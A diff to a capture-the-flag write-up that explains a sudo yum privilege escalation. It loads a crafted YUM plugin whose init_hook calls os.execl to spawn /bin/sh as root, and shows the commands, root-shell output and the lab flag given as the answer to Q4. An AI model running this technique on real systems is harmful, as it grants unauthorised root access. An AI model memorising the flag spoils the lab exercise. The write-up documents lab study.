@@ -391,7 +391,14 @@ EOF
 
 yum -c /path/to/temp-dir/x --enableplugin=y
 ```
-I found this on a walkthrough this its clearly based on the above exploit:
+I also found this on a walkthrough by Krishna Shukla, this its clearly based on the above exploit:
+
+Two elements from this walkthrough I was unsure about: 
+- Firstly the TF variable for folder done this way. TF is a reference for starters to a temporary unique and randomly named folder, something like /tmp/tmp.abCDe12345 this helps to avoid collisions, race conditions or broken PoCs and accidental overwrites.
+A side bonus is the directory is in the /tmp folder when the system reboots the contents of this directory is cleared on boot. 
+- Secondly Because the YUM process is already running as root (due to sudo), and because os.execl('/bin/sh','/bin/sh') replaces YUM in‑place with /bin/sh, the shell now runs with YUM’s root privileges. Since jjameson is controlling the terminal that YUM was using, he remains attached to the new /bin/sh process and therefore gains an interactive root shell.
+
+Here is what these additions looked like when combined as in the walkthough by Krishna Shukla:
 ```
 TF=$(mktemp -d)
 cat >$TF/x<<EOF
@@ -417,6 +424,7 @@ EOF
 
 sudo yum -c $TF/x --enableplugin=y
 ```
+How the exploit works:
 - A temporary directory ($TF) is created so the user has full control and clean, correct permissions for YUM to load files from.
 
 cat >$TF/x<<EOF writes a new file named x inside $TF.
@@ -464,10 +472,9 @@ YUM loads the plugin from $TF, executes init_hook(), and is replaced by a root s
 sh-4.2# sudo yum -c $TF/x --enableplugin=y
 Loaded plugins: y
 No plugin match for: y
-sh-4.2# nono $TF/y.py
-sh: nono: command not found
-sh-4.2# nano $TF/y.py
+sh-4.2# 
 ```
+
 Now check the user level and access the root.txt file.
 ```
 sh-4.2# id
@@ -478,3 +485,6 @@ anaconda-ks.cfg  root.txt
 sh-4.2# cat root.txt
 eec3d53292b1821868266858d7fa6f79
 sh-4.2# 
+```
+Answer Q4: eec3d53292b1821868266858d7fa6f79
+
